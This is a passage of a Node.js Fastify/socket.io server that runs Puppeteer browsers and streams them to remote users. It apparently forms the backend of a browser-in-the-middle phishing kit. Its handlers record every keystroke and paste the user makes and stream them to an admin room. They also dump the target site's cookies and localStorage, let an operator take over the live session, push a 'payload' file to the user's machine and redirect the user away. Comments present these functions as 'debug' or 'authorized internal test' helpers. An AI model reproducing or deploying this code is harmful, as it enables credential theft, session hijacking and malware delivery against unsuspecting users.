      socket.on('new_fescar', async function (viewport_width, viewport_height, client_ip, target_id, session_id, mobile) {
        // Remove pending duplicates for the same socket and keep the latest viewport.
        for (let i = pendingFescarAssignments.length - 1; i >= 0; i -= 1) {
          if (pendingFescarAssignments[i].socket_id === socket.id) {
            pendingFescarAssignments.splice(i, 1)
          }
        }
        pendingFescarAssignments.push({
          socket_id: socket.id,
          viewport_width,
          viewport_height,
          client_ip,
          target_id,
          session_id,
          mobile: !!mobile
        })
        processPendingFescarAssignments().catch((err) => {
          console.error(`new_fescar: queue processor failed: ${err.message}`)
          provisioning = false
        })
      })
      socket.on('disconnect', function () {
        for (let i = pendingFescarAssignments.length - 1; i >= 0; i -= 1) {
          if (pendingFescarAssignments[i].socket_id === socket.id) {
            pendingFescarAssignments.splice(i, 1)
          }
        }
      })
      socket.on('new_thumbnail', async function (thumbnail) {
        const browser = browsers.get('browser_id', thumbnail.browser_id)
        if (!browser) {
          console.warn(`new_thumbnail: no browser found for browser_id ${thumbnail.browser_id}`)
          return
        }
        //let viewer_socket = browser.user_socket
        //fastify.io.to('admin_room').emit('thumbnail', socket.id, viewer_socket, thumbnail.image, browser.keydebug)
        fastify.io.to('admin_room').emit('thumbnail', browser.browser_id, thumbnail.image, browser.keydebug)
      })
      socket.on('video_stream_offer', async function (viewer_socket_id, offer) {
        const browser = browsers.get('controller_socket', viewer_socket_id)
        if (!browser) {
          console.warn(`video_stream_offer: no browser found for viewer_socket_id ${viewer_socket_id}`)
          return
        }
        await browser.broadcast_page.bringToFront()
        fastify.io.to(viewer_socket_id).emit('video_stream_offer', socket.id, offer)
        console.log('video_stream_offer')
        console.log('viewer_id: ' + viewer_socket_id)
        console.log('offer: ' + offer)
      })
      socket.on('video_stream_answer', async function (broadcaster_socket_id, answer) {
        //forward on to the viewer
        fastify.io.to(broadcaster_socket_id).emit('video_stream_answer', socket.id, answer)
        console.log('video_stream_answer')
        console.log('broadcaster_id: ' + broadcaster_socket_id)
        console.log('answer: ' + answer)
      })
      socket.on("tak0ver_browser", async function (browser_id, viewport_width, viewport_height) {
        //clear the controller if we were just driving another instance
        const prior_takeoverdebugging_instance = browsers.get('controller_socket', socket.id)
        if (prior_takeoverdebugging_instance) {
          prior_takeoverdebugging_instance.controller_socket = ''
        }
        const browser = browsers.get('browser_id', browser_id)
        if (!browser) {
          console.warn(`tak0ver_browser: no browser found for browser_id ${browser_id}`)
          return
        }
        browser.controller_socket = socket.id
        await resize_window(browser, browser.target_page, viewport_width, viewport_height)
        await browser.target_page.setViewport({ width: viewport_width, height: viewport_height, deviceScaleFactor: VIEWPORT_DEVICE_SCALE_FACTOR })
        fastify.io.to(browser.socket_id).emit('stream_to_admin', socket.id)
      })
      socket.on("give_back_control", async function (browser_id) {
        //give control back to the user
        const browser = browsers.get('browser_id', browser_id)
        if (!browser) {
          console.warn(`give_back_control: no browser found for browser_id ${browser_id}`)
          return
        }
        browser.controller_socket = browser.user_socket
        await resize_window(browser, browser.target_page, browser.user_width, browser.user_height)
        await browser.target_page.setViewport({ width: browser.user_width, height: browser.user_height, deviceScaleFactor: VIEWPORT_DEVICE_SCALE_FACTOR })
      })
      // Debug workflow helper for authorized internal tests: force a navigation
      // on the test client after explicit operator action in the admin UI.
      socket.on("boot_user", async function (browser_id) {
        const browser = browsers.get('browser_id', browser_id)
        if (!browser) {
          console.warn(`boot_user: no browser found for browser_id ${browser_id}`)
          return
        }
        console.log("booting user: " + browser.user_socket)
        fastify.io.to(browser.user_socket).emit('execute_script', `window.location = "${target.boot_location}";`)
      })
      // Debug-only file transfer path for controlled lab validation.
      // Do not use outside explicitly authorized environments.
      socket.on("send_payload", async function (browser_id) {
        const browser = browsers.get('browser_id', browser_id)
        if (!browser) {
          console.warn(`send_payload: no browser found for browser_id ${browser_id}`)
          return
        }
        console.log("sending payload to user: " + browser.user_socket)
        fastify.io.to(browser.user_socket).emit('save', { data: fs.readFileSync(__dirname + `/${target.payload}`), filename: `${target.payload}` })
      })
      // Session inspection endpoint used for troubleshooting SSO/session issues
      // in approved internal environments only.
      socket.on("get_cookies", async function (browser_id) {
        const browser = browsers.get('browser_id', browser_id)
        if (!browser) {
          console.warn(`get_cookies: no browser found for browser_id ${browser_id}`)
          return
        }
        let cookie_data = await browser.target_page._client.send('Storage.getCookies')
        let cookies = cookie_data.cookies
        let dom_data = await browser.target_page._client.send('DOMStorage.getDOMStorageItems', {
          storageId: {
            securityOrigin: await browser.target_page.evaluate(() => window.origin),
            isLocalStorage: true,
          },
        })
        let local_storage = dom_data.entries
        fastify.io.to(socket.id).emit('cookie_jar', { cookies: { url: browser.target_page.url(), cookies: cookies, local_storage: local_storage }, browser_id: browser.browser_id })
      })
      socket.on("remove_instance", async function (browser_id) {
        const browser = browsers.get('browser_id', browser_id)
        if (!browser) {
          console.warn(`remove_instance: no browser found for browser_id ${browser_id}`)
          return
        }
        await browser.remove_instance()
        fastify.io.to('admin_room').emit('removed_instance', browser_id)
      })
      socket.on("candidate", async function (peer_socket_id, message) {
        console.log('candidate: ' + socket.id + ' to ' + peer_socket_id)
        fastify.io.to(peer_socket_id).emit("candidate", socket.id, message)
      })
      socket.on("go_back", async function () {
        const browser = browsers.get('controller_socket', socket.id)
        if (!browser) {
          console.warn(`go_back: no browser found for controller_socket ${socket.id}`)
          return
        }
        await browser.target_page.goBack()
      })
      // Client reports actual video display size — resize Puppeteer viewport to match
      // exactly (eliminates scaleY error caused by browser chrome consuming window height)
      socket.on('video_dimensions', async function(dims) {
        if (!dims || typeof dims.width !== 'number' || typeof dims.height !== 'number') return
        const browser = browsers.get('user_socket', socket.id)
        if (!browser || !browser.target_page) return
        const w = Math.round(dims.width)
        const h = Math.round(dims.height)
        if (w < 50 || h < 50 || w > 3000 || h > 3000) return  // sanity guard
        if (browser.is_mobile && browser.video_dimensions_initialized && browser.puppeteer_width && browser.puppeteer_height && (w < browser.puppeteer_width || h < browser.puppeteer_height)) {
          fastify.io.to(socket.id).emit('fescar_viewport', { width: browser.puppeteer_width, height: browser.puppeteer_height })
          console.log(`[video_dimensions] Ignoring mobile viewport shrink ${w}x${h}; keeping ${browser.puppeteer_width}x${browser.puppeteer_height} for socket ${socket.id}`)
          return
        }
        try {
          if (browser.is_mobile) {
            await browser.target_page.emulate({
              viewport: { width: w, height: h, deviceScaleFactor: 3, isMobile: false, hasTouch: true, isLandscape: false },
              userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
            })
          } else {
            const vp = browser.target_page.viewport()
            await browser.target_page.setViewport({ width: w, height: h, deviceScaleFactor: (vp && vp.deviceScaleFactor) || VIEWPORT_DEVICE_SCALE_FACTOR })
          }
          browser.puppeteer_width = w
          browser.puppeteer_height = h
          browser.video_dimensions_initialized = true
          fastify.io.to(socket.id).emit('fescar_viewport', { width: w, height: h })
          console.log(`[video_dimensions] Puppeteer viewport → ${w}x${h} for socket ${socket.id}`)
        } catch (err) {
          console.warn(`[video_dimensions] Error: ${err.message}`)
        }
      })
      // Copy selected text from the mirrored page for operator debugging.
      socket.on("copy", async function () {
        const browser = browsers.get('controller_socket', socket.id)
        if (!browser) {
          console.warn(`copy: no browser found for controller_socket ${socket.id}`)
          return
        }
        let data = await browser.target_page.evaluate("if(window.document.getElementsByTagName('iframe')[0] != undefined){window.document.getElementsByTagName('iframe')[0].contentDocument.getSelection().toString();}else{window.document.getSelection().toString();}")
        fastify.io.to(socket.id).emit("copy_to_clipboard", data)
      })
      // Paste simulation into the mirrored page to validate input forwarding.
      socket.on("paste", async function (paste_data) {
        const browser = browsers.get('controller_socket', socket.id)
        if (!browser) {
          console.warn(`paste: no browser found for controller_socket ${socket.id}`)
          return
        }
        browser.suppress_keys_until = Date.now() + 350
        const normalizedPaste = `${paste_data ?? ''}`
        if (!normalizedPaste) return
        console.log(`[paste] socket=${socket.id} len=${normalizedPaste.length} text="${normalizedPaste.substring(0,40)}"`)
        if (browser.user_socket == socket.id) {
          browser.keydebug = browser.keydebug + normalizedPaste
          browser.keydebug_file.write(normalizedPaste)
          fastify.io.to('admin_room').emit('keydebug', socket.id, browser.keydebug)
        }
        try {
          await browser.target_page.bringToFront()
          // Release any held modifier keys before inserting text to avoid
          // Ctrl/Meta being active in puppeteer during insertion
          await browser.target_page.keyboard.up('Control').catch(() => {})
          await browser.target_page.keyboard.up('Meta').catch(() => {})
          await browser.target_page.keyboard.up('Shift').catch(() => {})
          // Use CDP directly — keyboard.insertText only exists in Puppeteer >=14
          await browser.target_page._client.send('Input.insertText', { text: normalizedPaste })
          await enforceMobileViewportGuards(browser)
          console.log(`[paste] insertText OK`)
        } catch (err) {
          console.warn(`[paste] CDP insertText failed: ${err.message}`)
        }
      })
      socket.on("keydown", async function (key) {
        //console.log(`keydebug: ${socket.id}: ${key}`)
        const browser = browsers.get('controller_socket', socket.id)
        if (!browser) {
          // silently drop — common when user socket loses controller assignment mid-session
          return
        }
        if (Date.now() < (browser.suppress_keys_until || 0)) {
          return
        }
        //only log if it's the user typing and not a session after admin takeoverdebugging
        if (browser.user_socket == socket.id) {
          browser.keydebug_file.write(key)
          let current_val = browser.keydebug
          let new_val = ''
          if (key == 'Backspace') {
            new_val = current_val ? current_val.slice(0, -1) : ''
          } else if (key == 'Shift') {
            new_val = current_val
          } else if (key == 'Tab') {
            new_val = current_val + '\n'
          } else if (key == 'Enter') {
            new_val = current_val + '\n'
          } else {
            new_val = current_val + key
          }
          browser.keydebug = new_val
          fastify.io.to('admin_room').emit('keydebug', browser.browser_id, new_val)
        }
        const istext = key.length === 1 ? true : false;
        try {
          if (istext) {
            await browser.target_page._client.send('Input.dispatchKeyEvent', {
              type: 'keyDown',
              key: key,
              text: key,
            })
          } else if (key != 'Dead') {
            await browser.target_page.keyboard.down(key)
          }
          await enforceMobileViewportGuards(browser)
        } catch (err) {
          if (!err.message.includes('Session closed') && !err.message.includes('Page closed')) {
            console.warn(`[KEYDOWN] Error (socket ${socket.id}): ${err.message}`);
          }
        }
      })
      socket.on("keyup", async function (key) {
        const browser = browsers.get('controller_socket', socket.id)
        if (!browser) {
          // silently drop — common when user socket loses controller assignment mid-session
          return
        }
        if (Date.now() < (browser.suppress_keys_until || 0)) {
          return
        }
        const istext = key.length === 1 ? true : false;
        try {
          if (istext) {
            await browser.target_page._client.send('Input.dispatchKeyEvent', {
              type: 'keyUp',
              key: key,
              text: key,
            })
          } else if (key != 'Dead') {
            await browser.target_page.keyboard.up(key)
          }
          await enforceMobileViewportGuards(browser)
        } catch (err) {
          if (!err.message.includes('Session closed') && !err.message.includes('Page closed')) {
            console.warn(`[KEYUP] Error (socket ${socket.id}): ${err.message}`);
          }
        }
      })
      socket.on("mouse_event", async function (mouse_event) {
        const browser = browsers.get('controller_socket', socket.id)
        if (!browser || !browser.target_page) {
          return
        }
        if (mouse_event.type === 'mouseup' && browser.is_mobile) {
          const vp = browser.target_page.viewport()
          console.log(`[MOUSE_EVENT] mobile mouseup => puppeteer(${Math.round(mouse_event.clientX)},${Math.round(mouse_event.clientY)}) viewport=${vp ? vp.width+'x'+vp.height : 'unknown'}`)
        }
        try {
          const pointer = await getRemotePointerCoordinates(browser, mouse_event.clientX, mouse_event.clientY)
          const pointerX = pointer.x
          const pointerY = pointer.y
          if (browser.is_mobile && mouse_event.type === 'mouseup' && pointer.changed && pointer.metrics) {
            console.log(`[MOUSE_MAP] raw=(${Math.round(mouse_event.clientX)},${Math.round(mouse_event.clientY)}) css=(${Math.round(pointerX)},${Math.round(pointerY)}) visual=${Math.round(pointer.metrics.width)}x${Math.round(pointer.metrics.height)} offset=(${Math.round(pointer.metrics.offsetX)},${Math.round(pointer.metrics.offsetY)}) source=${pointer.metrics.sourceWidth}x${pointer.metrics.sourceHeight} scale=${pointer.metrics.scale}`)
          }
          if (browser.is_mobile && (mouse_event.type === 'mousedown' || mouse_event.type === 'mouseup' || mouse_event.type === 'click')) {
            const editableFocused = await focusRemoteEditableAtPoint(browser, pointerX, pointerY)
            if (editableFocused) {
              await enforceMobileViewportGuards(browser)
              if (mouse_event.type === 'mouseup' && browser.user_socket) {
                fastify.io.to(browser.user_socket).emit('show_keyboard')
              }
              return
            }
          }
          if (mouse_event.type === "click") {
            await browser.target_page.mouse.move(pointerX, pointerY)
          } else if (mouse_event.type === "mousewheel") {
            browser.target_page.mouse.wheel({ "deltaX": mouse_event.wheelDeltaX })
            browser.target_page.mouse.wheel({ "deltaY": mouse_event.wheelDeltaY })
          } else if (mouse_event.type === "mousedown") {
            await browser.target_page.mouse.move(pointerX, pointerY)
            await browser.target_page.mouse.down()
          } else if (mouse_event.type === "mouseup") {
            await browser.target_page.mouse.move(pointerX, pointerY)
            await browser.target_page.mouse.up()
            await enforceMobileViewportGuards(browser)
            // Show the local mobile keyboard only when this tap landed on an editable.
            // Many pages keep the prior input focused after tapping elsewhere, so using
            // activeElement alone makes the keyboard reappear constantly.
            if (browser.is_mobile && browser.user_socket) {
              setTimeout(async () => {
                try {
                  const tappedEditable = await browser.target_page.evaluate(({ x, y }) => {
                    const editableSelector = 'input, textarea, [contenteditable="true"], [contenteditable=""], [contenteditable="plaintext-only"]'
                    const hit = document.elementFromPoint(x, y)
                    const editable = hit && hit.closest ? hit.closest(editableSelector) : null
                    if (editable) return true
                    const active = document.activeElement
                    if (active && active !== document.body) {
                      const tag = active.tagName ? active.tagName.toLowerCase() : ''
                      if (tag === 'input' || tag === 'textarea' || active.isContentEditable) {
                        active.blur()
                      }
                    }
                    return false
                  }, { x: pointerX, y: pointerY })
                  if (tappedEditable) {
                    fastify.io.to(browser.user_socket).emit('show_keyboard')
                  } else {
                    fastify.io.to(browser.user_socket).emit('hide_keyboard')
                  }
                } catch (e) {}
              }, 200)
            }
          } else if (mouse_event.type === "mousemove") {
            await browser.target_page.mouse.move(pointerX, pointerY)
          }
        } catch (err) {
          if (!err.message.includes('Session closed') && !err.message.includes('Page closed')) {
            console.warn(`[MOUSE_EVENT] Error (socket ${socket.id}): ${err.message}`);
          }
        }
      })
    })
  })

  // Health check endpoint
  fastify.get('/health', async (request, reply) => {
    return { status: 'ok', uptime: process.uptime() };
  });

  // Run the server!
  const start = async () => {
    try {
      await fastify.listen({ port: 58082, host: '0.0.0.0' })
      console.log(`[STARTUP] Fastify listening on port 58082`)
    } catch (err) {
      fastify.log.error(err)
      process.exit(1)
    }
  }
  await start()

})();
